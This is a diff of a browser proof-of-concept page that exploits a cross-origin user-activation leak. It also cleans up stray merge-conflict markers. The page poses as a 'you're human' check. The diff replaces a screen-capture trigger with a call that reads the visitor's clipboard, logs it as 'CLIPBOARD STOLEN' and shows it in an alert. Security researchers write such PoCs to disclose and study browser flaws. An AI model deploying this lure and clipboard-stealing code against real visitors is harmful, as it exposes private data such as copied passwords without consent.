@@ -5,10 +5,7 @@
     <meta charset="UTF-8">
     <title>PoC - Target Page (Vulnerable Origin)</title>
 </head>
-<<<<<<< HEAD
 
-=======
->>>>>>> 8bdd8a6a09f2cad8b40d623fd301fe3630642267
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
     <h1>success, you're human</h1>
     <script>
@@ -26,14 +23,15 @@
 
             if (isActive && !triggered) {
                 triggered = true;
-                console.log("[!] Activation leak detected. Triggering getDisplayMedia...");
-
-                navigator.mediaDevices.getDisplayMedia({ video: true })
-                    .then(() => {
-                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.");
+                console.log("[!] Activation leak detected. Triggering Clipboard Read...");
+                navigator.clipboard.readText()
+                    .then((text) => {
+                        console.log("[!!!] CLIPBOARD STOLEN:", text);
+                        alert("EXPLOIT SUCCESS!\n\nUser Activation leaked.\nI can see your clipboard content:\n\n" + text);
+                        triggered = false;
                     })
                     .catch(e => {
-                        console.log("API blocked/dismissed:", e.message);
+                        console.log("Clipboard API blocked/dismissed:", e.message);
                         triggered = false;
                     });
             }
